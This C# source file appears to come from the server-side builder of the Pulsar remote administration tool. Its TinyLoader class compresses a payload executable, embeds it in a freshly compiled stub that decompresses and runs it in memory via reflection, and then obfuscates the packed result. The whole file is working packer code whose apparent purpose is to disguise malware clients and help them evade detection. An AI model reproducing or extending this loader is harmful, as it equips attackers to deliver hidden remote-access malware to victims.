using dnlib.DotNet;
using Pulsar.Server.Build.Obfuscator.Utils.Injection;
using Pulsar.Server.Build.Obfuscator.Utils;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using dnlib.DotNet.MD;
using Microsoft.CSharp;
using System.CodeDom.Compiler;
using System.IO.Compression;

namespace Pulsar.Server.Build.TinyLoader
{
    public class TinyLoader
    {

        private byte[] app;

        public TinyLoader(string path)
        {
            app = File.ReadAllBytes(path);
        }

        public TinyLoader(byte[] data)
        {
            app = data;
        }

        public void Save(string path)
        {
            File.WriteAllBytes(path, app);
        }

        public byte[] Save()
        {
            return app;
        }

        public static byte[] Compress(byte[] data)
        {
            MemoryStream output = new MemoryStream();
            using (DeflateStream dstream = new DeflateStream(output, CompressionLevel.Optimal))
            {
                dstream.Write(data, 0, data.Length);
            }
            return output.ToArray();
        }

        public byte[] Compile()
        {
            string sourceCode = @"
using System;
using System.Reflection;
using System.IO;
using System.IO.Compression;
namespace a
{
    class a
    {
        [STAThread]
        static void Main()
        {
            using (Stream a = Assembly.GetExecutingAssembly().GetManifestResourceStream(""a""))
            {
                MemoryStream b = new MemoryStream();
                using (DeflateStream c = new DeflateStream(a, CompressionMode.Decompress))
                {
                    c.CopyTo(b);
                }
              
                Assembly.Load(b.ToArray()).EntryPoint.Invoke(null, new object[] { new string[]{} });
            }
        }
    }
}";

            CSharpCodeProvider provider = new CSharpCodeProvider();
            CompilerParameters parameters = new CompilerParameters();


            parameters.GenerateExecutable = true;
            parameters.GenerateInMemory = false;
            parameters.TreatWarningsAsErrors = false;
            parameters.IncludeDebugInformation = false;
            parameters.ReferencedAssemblies.Add("System.dll");
            parameters.ReferencedAssemblies.Add("System.Reflection.dll");
            parameters.ReferencedAssemblies.Add("System.IO.dll");
            parameters.ReferencedAssemblies.Add("System.IO.Compression.dll");

            parameters.CompilerOptions = "/target:winexe";

            string tempFile = "temploader.exe";
            parameters.OutputAssembly = tempFile;

            CompilerResults results = provider.CompileAssemblyFromSource(parameters, sourceCode);

            if (results.Errors.HasErrors)
            {
                StringBuilder errors = new StringBuilder("Compilation errors:");
                foreach (CompilerError error in results.Errors)
                {
                    errors.AppendLine(string.Format("Line {0}: {1}", error.Line, error.ErrorText));
                }
                throw new Exception(errors.ToString());
            }

            byte[] output = File.ReadAllBytes(tempFile);
            try { File.Delete(tempFile); } catch { }
            return output;
        }

        public void Pack()
        {
            byte[] loader = Compile();
            ModuleDefMD module = ModuleDefMD.Load(loader);


            module.Resources.Add(new EmbeddedResource("a", Compress(app), ManifestResourceAttributes.Public));

            MemoryStream stream = new MemoryStream();
            module.Write(stream);

            app = stream.ToArray();
            Obfuscator.Obfuscator obf = new Obfuscator.Obfuscator(app);
            obf.Obfuscate();
            app = obf.Save();

        }

    }
}
